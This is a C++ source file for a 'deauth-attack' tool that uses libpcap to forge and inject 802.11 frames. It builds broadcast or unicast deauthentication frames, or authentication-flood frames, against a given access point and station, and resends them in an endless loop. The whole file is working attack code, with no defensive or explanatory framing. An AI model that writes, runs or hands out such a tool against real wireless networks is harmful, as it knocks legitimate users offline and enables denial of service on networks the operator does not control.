#include "CDeauthAttack.h"


void CParam::usage() 
{
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}


bool CParam::parse(int argc, char* argv[])
{
	if (argc < 3) {
		usage();
		return false;
	}

	for(int i =1; i < argc; i++)
		params.push_back(argv[i]);
		

	return true;
}



CDeauthAttack::CDeauthAttack(CParam parameter) : param(parameter)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	std::string interface = param.params[0];
	pcap = pcap_open_live(interface.data(), 0, 0, 0, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface.data(), errbuf);
        exit(1);
	}

}

CDeauthAttack::~CDeauthAttack(){

	for(char * packet : packets)
	{
		delete[] packet;
	}

    pcap_close(pcap);  
}


int CDeauthAttack::deauthAttack()
{
	u_int8_t attackMode = getType();
	makePacket(attackMode);
	
	while(1)
		sendPacket();

}

void CDeauthAttack::makePacket(u_int8_t attackMode)
{
	
	switch(attackMode)
	{
		case mode::AUTHATTACK:
			
			makeAuth();
			break;
		case mode::BROADCASTDEAUTHATTACK:
			
			makeBroadcastDeauth();
			break;		
		case mode::UNICASTDEAUTHATTACK:
			
			makeUnicastDeauth();


	}

}

void CDeauthAttack::makeUnicastDeauth()
{
	char * stationPacket = new char[sizeof(ST_DEAUTH_WIRELESS_PACKET)];
	ST_DEAUTH_WIRELESS_PACKET* stationWirelessPacket = (ST_DEAUTH_WIRELESS_PACKET*)stationPacket;	
	stationWirelessPacket->radioTapHeader.revision = 0x00;
	stationWirelessPacket->radioTapHeader.pad = 0x00;
	stationWirelessPacket->radioTapHeader.length = 0x000C;
	stationWirelessPacket->radioTapHeader.present[0] = 0x04 ;
	stationWirelessPacket->radioTapHeader.present[1] = 0x80;
	stationWirelessPacket->radioTapHeader.present[2] = 0x00;
	stationWirelessPacket->radioTapHeader.present[3] = 0x00;
	stationWirelessPacket->radioTapHeader.dataRate = 0x02;
	stationWirelessPacket->radioTapHeader.txFlags = 0x0000;

	stationWirelessPacket->authentication.frameControlField = (0x00<<8) + (type);
	stationWirelessPacket->authentication.duration = 0x0000;
	stationWirelessPacket->authentication.dstMac = Mac(param.params[1]);
	stationWirelessPacket->authentication.srcMac = getMac();
	stationWirelessPacket->authentication.bssidMac = getMac();
	stationWirelessPacket->authentication.fragmentSeqNum = 0x00 + (0x9fe << 4);

	stationWirelessPacket->fixedParameter.reasonCode = 0x0007;
	
	packets.push_back(stationPacket);

	char * apPacket = new char[sizeof(ST_DEAUTH_WIRELESS_PACKET)];
	ST_DEAUTH_WIRELESS_PACKET* apWirelessPacket = (ST_DEAUTH_WIRELESS_PACKET*)apPacket;	
	apWirelessPacket->radioTapHeader.revision = 0x00;
	apWirelessPacket->radioTapHeader.pad = 0x00;
	apWirelessPacket->radioTapHeader.length = 0x000C;
	apWirelessPacket->radioTapHeader.present[0] = 0x04 ;
	apWirelessPacket->radioTapHeader.present[1] = 0x80;
	apWirelessPacket->radioTapHeader.present[2] = 0x00;
	apWirelessPacket->radioTapHeader.present[3] = 0x00;
	apWirelessPacket->radioTapHeader.dataRate = 0x02;
	apWirelessPacket->radioTapHeader.txFlags = 0x0000;

	apWirelessPacket->authentication.frameControlField = (0x00<<8) + (type);
	apWirelessPacket->authentication.duration = 0x0000;
	apWirelessPacket->authentication.dstMac = getMac();
	apWirelessPacket->authentication.srcMac = Mac(param.params[1]);
	apWirelessPacket->authentication.bssidMac = Mac(param.params[1]);
	apWirelessPacket->authentication.fragmentSeqNum = 0x00 + (0x9fe << 4);

	apWirelessPacket->fixedParameter.reasonCode = 0x0007;

	packets.push_back(apPacket);
	

}


void CDeauthAttack::makeBroadcastDeauth()
{
	char * packet = new char[sizeof(ST_DEAUTH_WIRELESS_PACKET)];
	ST_DEAUTH_WIRELESS_PACKET* wirelessPacket = (ST_DEAUTH_WIRELESS_PACKET*)packet;

	wirelessPacket->radioTapHeader.revision = 0x00;
	wirelessPacket->radioTapHeader.pad = 0x00;
	wirelessPacket->radioTapHeader.length = 0x000C;
	wirelessPacket->radioTapHeader.present[0] = 0x04 ;
	wirelessPacket->radioTapHeader.present[1] = 0x80;
	wirelessPacket->radioTapHeader.present[2] = 0x00;
	wirelessPacket->radioTapHeader.present[3] = 0x00;
	wirelessPacket->radioTapHeader.dataRate = 0x02;
	wirelessPacket->radioTapHeader.txFlags = 0x0000;

	wirelessPacket->authentication.frameControlField = (0x00<<8) + (type);
	wirelessPacket->authentication.duration = 0x0000;
	wirelessPacket->authentication.dstMac = getMac();
	wirelessPacket->authentication.srcMac = Mac(param.params[1]);
	wirelessPacket->authentication.bssidMac = Mac(param.params[1]);
	wirelessPacket->authentication.fragmentSeqNum = 0x00 + (0x9fe << 4);

	wirelessPacket->fixedParameter.reasonCode = 0x0007;

	packets.push_back(packet);

}

void CDeauthAttack::makeAuth()
{
	char * packet = new char[sizeof(ST_AUTH_WIRELESS_PACKET)];
	ST_AUTH_WIRELESS_PACKET* wirelessPacket = (ST_AUTH_WIRELESS_PACKET*)packet;

	wirelessPacket->radioTapHeader.revision = 0x00;
	wirelessPacket->radioTapHeader.pad = 0x00;
	wirelessPacket->radioTapHeader.length = 0x000c;
	wirelessPacket->radioTapHeader.present[0] = 0x04 ;
	wirelessPacket->radioTapHeader.present[1] = 0x80;
	wirelessPacket->radioTapHeader.present[2] = 0x00;
	wirelessPacket->radioTapHeader.present[3] = 0x00;
	wirelessPacket->radioTapHeader.dataRate = 0x02;
	wirelessPacket->radioTapHeader.txFlags = 0x0000;

	wirelessPacket->authentication.frameControlField = (0x00<<8) + (type);
	wirelessPacket->authentication.duration = 0x013a;
	wirelessPacket->authentication.dstMac = Mac(param.params[1]);
	wirelessPacket->authentication.srcMac = getMac();
	wirelessPacket->authentication.bssidMac = Mac(param.params[1]);
	wirelessPacket->authentication.fragmentSeqNum = 0x00 + (0x9fe << 4);

	wirelessPacket->fixedParameter.authenticationAlgorithm = 0x0000;
	wirelessPacket->fixedParameter.authenticationSeq = 0x0200;
	wirelessPacket->fixedParameter.statusCode = 0x0000;

	packets.push_back(packet);

}

u_int8_t CDeauthAttack::getType()
{

	type = TYPE::DEAUTHENTICATION;

	for(int i = 2; i < param.params.size(); i++)
	{
		if(param.params[i] == "-auth")
		{
			size = sizeof(ST_AUTH_WIRELESS_PACKET);			
			type = TYPE::AUTHENTICATION;
			return mode::AUTHATTACK;
		}
	}
	
	size = sizeof(ST_DEAUTH_WIRELESS_PACKET);
	if(param.params.size() == 3)
		return mode::UNICASTDEAUTHATTACK;

	return mode::BROADCASTDEAUTHATTACK;

	

}

Mac CDeauthAttack::getMac()
{
	Mac dstMac("FF:FF:FF:FF:FF:FF");

	for(int i = 2; i < param.params.size(); i++)
	{
		if(param.params[i] == "-auth")
			continue;
		dstMac = Mac(param.params[i]);
	}

	return dstMac;

}


void CDeauthAttack::sendPacket()
{


	for(char * packet : packets)
	{
		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(packet), size);
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
	}

	sleep(0.001);
}    
